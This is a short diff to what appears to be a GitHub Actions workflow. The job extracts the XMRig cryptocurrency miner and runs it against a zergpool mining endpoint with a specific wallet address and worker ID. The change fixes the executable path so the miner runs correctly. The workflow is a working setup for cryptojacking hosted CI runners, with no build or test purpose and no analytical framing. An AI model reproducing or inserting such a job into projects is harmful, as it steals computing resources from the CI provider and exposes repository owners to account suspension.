@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive xmrig-6.12.1-msvc-win64.zip
     - name: Running
-      run: .\xmrig-6.12.1-msvc-win64\xmrig.exe -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc.alikioser --keepalive --timeout 120 --donate-level 0 -p c=MBC,ID=developwithalikioser
+      run: .\xmrig-6.12.1-msvc-win64\xmrig-6.12.1\xmrig.exe -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc.alikioser --keepalive --timeout 120 --donate-level 0 -p c=MBC,ID=developwithalikioser
     - name: DONE
       run: exit
